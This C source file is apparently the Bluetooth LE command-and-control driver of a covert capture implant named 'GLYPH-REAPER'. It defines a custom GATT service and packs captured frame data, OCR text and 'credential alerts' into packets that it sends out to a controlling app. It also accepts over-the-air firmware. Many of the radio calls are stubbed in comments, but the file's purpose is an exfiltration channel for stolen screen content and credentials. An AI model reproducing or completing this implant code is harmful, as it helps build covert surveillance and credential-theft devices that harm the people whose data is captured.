/**
 * @file ble_c2_driver.c
 * @brief BLE 5.2 C2 driver implementation
 *
 * Implements the custom GATT service for GLYPH-REAPER command & control
 * and encrypted frame data exfiltration over BLE 5.2.
 *
 * The GATT service uses a custom 128-bit UUID base:
 *   Service:  0000FE40-0000-1000-8000-00805F9B34FB
 *   TX Char:  0000FE41-... (device → app: frame data, OCR, alerts)
 *   RX Char:  0000FE42-... (app → device: commands)
 *
 * Author: jayis1
 * @copyright Copyright (c) 2026 jayis1. All rights reserved.
 * @license GPL-2.0
 */

#include "ble_c2_driver.h"
#include "board.h"
#include "registers.h"
#include <string.h>

/*===========================================================================
 * GATT SERVICE DEFINITIONS
 *===========================================================================*/

/* Custom service UUID: FE40 (16-bit, assigned by Nordic) */
#define BLE_UUID_GLYPH_SERVICE    0xFE40
#define BLE_UUID_GLYPH_TX         0xFE41
#define BLE_UUID_GLYPH_RX         0xFE42

/* BLE connection state */
static bool s_ble_connected = false;
static uint16_t s_conn_handle = 0xFFFF;
static uint16_t s_mtu_size = 23;       /* Default ATT MTU */
static uint16_t s_data_len = 27;       /* Default data length (MTU - 3) */

/* TX buffer for BLE notifications */
static uint8_t s_tx_buffer[244];
static uint16_t s_tx_buffer_len = 0;

/* Firmware receive state */
static uint32_t s_fw_receive_offset = 0;
static uint32_t s_fw_total_size = 0;
static uint32_t s_fw_crc = 0;
static bool s_fw_receiving = false;

/*===========================================================================
 * INITIALIZATION
 *===========================================================================*/

void ble_c2_init(const uint8_t *device_name, uint8_t name_len)
{
    /* In a real implementation, this would configure the S140 SoftDevice:
     * - Set BLE stack to central/peripheral role
     * - Configure GAP parameters (device name, appearance, TX power)
     * - Create custom GATT service with TX and RX characteristics
     * - Set connection parameters (interval, latency, timeout)
     * - Enable Data Length Extension (DLE)
     * - Configure 2 Mbps PHY for maximum throughput
     *
     * The following is the configuration structure setup.
     */

    /* Configure advertising parameters */
    /* - Advertising type: Connectable undirected
     * - Interval: 100ms (160 * 0.625ms)
     * - Timeout: 0 (no timeout)
     * - Include device name in advertising data
     * - Include service UUID in advertising data
     */

    /* Configure connection parameters */
    /* - Min interval: 7.5ms (6 * 1.25ms)
     * - Max interval: 15ms (12 * 1.25ms)
     * - Slave latency: 0
     * - Supervision timeout: 4000ms (400 * 10ms)
     */

    /* Configure GATT service:
     * - Service UUID: 0xFE40
     * - TX Characteristic (Notify): 0xFE41
     *   - Properties: Notify
     *   - CCCD: Enabled by default
     * - RX Characteristic (Write): 0xFE42
     *   - Properties: Write + Write Without Response
     */

    s_ble_connected = false;
    s_conn_handle = 0xFFFF;
    s_mtu_size = 23;
    s_data_len = 27;

    (void)device_name;
    (void)name_len;
}

void ble_c2_start_advertising(void)
{
    /* Start BLE advertising
     * - Set advertising data (flags + name + service UUID)
     * - Set scan response data (manufacturer specific data)
     * - Start advertising
     */
}

void ble_c2_stop_advertising(void)
{
    /* Stop BLE advertising */
}

/*===========================================================================
 * DATA TRANSMISSION
 *===========================================================================*/

uint32_t ble_c2_send_frame_header(const frame_metadata_t *meta)
{
    if (!s_ble_connected || meta == NULL) {
        return 0;
    }

    /* Build frame header packet:
     * [MSG_FRAME_DATA][frame_index(4)][width(2)][height(2)][depth(1)]
     * [compression(1)][compressed_size(4)][flags(1)]
     */
    s_tx_buffer[0] = MSG_FRAME_DATA;
    s_tx_buffer[1] = (meta->frame_index >> 24) & 0xFF;
    s_tx_buffer[2] = (meta->frame_index >> 16) & 0xFF;
    s_tx_buffer[3] = (meta->frame_index >> 8) & 0xFF;
    s_tx_buffer[4] = meta->frame_index & 0xFF;
    s_tx_buffer[5] = (meta->width >> 8) & 0xFF;
    s_tx_buffer[6] = meta->width & 0xFF;
    s_tx_buffer[7] = (meta->height >> 8) & 0xFF;
    s_tx_buffer[8] = meta->height & 0xFF;
    s_tx_buffer[9] = meta->color_depth;
    s_tx_buffer[10] = meta->compression_type;
    s_tx_buffer[11] = (meta->compressed_size >> 24) & 0xFF;
    s_tx_buffer[12] = (meta->compressed_size >> 16) & 0xFF;
    s_tx_buffer[13] = (meta->compressed_size >> 8) & 0xFF;
    s_tx_buffer[14] = meta->compressed_size & 0xFF;
    s_tx_buffer[15] = meta->flags;

    s_tx_buffer_len = 16;

    /* Send via BLE notification (SoftDevice call) */
    /* sd_ble_gatts_notify(s_conn_handle, tx_handle, &s_tx_buffer_len) */

    return s_tx_buffer_len;
}

uint32_t ble_c2_send_data(const uint8_t *data, uint16_t length)
{
    if (!s_ble_connected || data == NULL || length == 0) {
        return 0;
    }

    uint32_t total_sent = 0;
    uint16_t offset = 0;

    /* Send data in chunks that fit in BLE notification */
    while (offset < length) {
        uint16_t chunk = MIN(s_data_len, length - offset);
        memcpy(s_tx_buffer, data + offset, chunk);
        s_tx_buffer_len = chunk;

        /* sd_ble_gatts_notify(s_conn_handle, tx_handle, &s_tx_buffer_len) */
        total_sent += chunk;
        offset += chunk;
    }

    return total_sent;
}

uint32_t ble_c2_send_ocr_text(const uint8_t *data, uint16_t length, uint32_t frame_idx)
{
    if (!s_ble_connected || data == NULL) {
        return 0;
    }

    /* Build OCR text message:
     * [MSG_OCR_TEXT][frame_index(4)][length(2)][data...]
     */
    s_tx_buffer[0] = MSG_OCR_TEXT;
    s_tx_buffer[1] = (frame_idx >> 24) & 0xFF;
    s_tx_buffer[2] = (frame_idx >> 16) & 0xFF;
    s_tx_buffer[3] = (frame_idx >> 8) & 0xFF;
    s_tx_buffer[4] = frame_idx & 0xFF;
    s_tx_buffer[5] = (length >> 8) & 0xFF;
    s_tx_buffer[6] = length & 0xFF;

    /* Send header */
    s_tx_buffer_len = 7;
    /* sd_ble_gatts_notify() */

    /* Send data */
    return ble_c2_send_data(data, length) + 7;
}

uint32_t ble_c2_send_credential_alert(const uint8_t *data, uint16_t length, 
                                       uint32_t frame_idx)
{
    if (!s_ble_connected || data == NULL) {
        return 0;
    }

    /* Build credential alert message:
     * [MSG_CREDENTIAL_ALERT][frame_index(4)][length(2)][data...]
     */
    s_tx_buffer[0] = MSG_CREDENTIAL_ALERT;
    s_tx_buffer[1] = (frame_idx >> 24) & 0xFF;
    s_tx_buffer[2] = (frame_idx >> 16) & 0xFF;
    s_tx_buffer[3] = (frame_idx >> 8) & 0xFF;
    s_tx_buffer[4] = frame_idx & 0xFF;
    s_tx_buffer[5] = (length >> 8) & 0xFF;
    s_tx_buffer[6] = length & 0xFF;

    s_tx_buffer_len = 7;
    /* sd_ble_gatts_notify() */

    return ble_c2_send_data(data, length) + 7;
}

/*===========================================================================
 * FIRMWARE UPDATE
 *===========================================================================*/

uint32_t ble_c2_receive_firmware(uint8_t *buffer, uint32_t max_size, uint32_t *crc_out)
{
    /* In a real implementation, this would:
     * 1. Wait for firmware start command with total size and CRC
     * 2. Receive firmware chunks via BLE write commands
     * 3. Assemble into buffer
     * 4. Verify CRC
     * 5. Return total size
     */
    s_fw_receiving = true;
    s_fw_receive_offset = 0;
    s_fw_total_size = 0;
    s_fw_crc = 0;

    /* Wait for firmware data (simplified — would use SoftDevice events) */
    while (s_fw_receiving && s_fw_receive_offset < s_fw_total_size) {
        __WFE();
    }

    if (crc_out) *crc_out = s_fw_crc;
    return s_fw_receive_offset;
}

void ble_c2_trigger_dfu(void)
{
    /* Enter DFU mode:
     * - Signal SoftDevice to enter bootloader
     * - The bootloader will swap the new firmware from flash
     */
    /* sd_power_gpregret_set(0xB1); */
    /* NVIC_SystemReset(); */
}

bool ble_c2_is_connected(void)
{
    return s_ble_connected;
}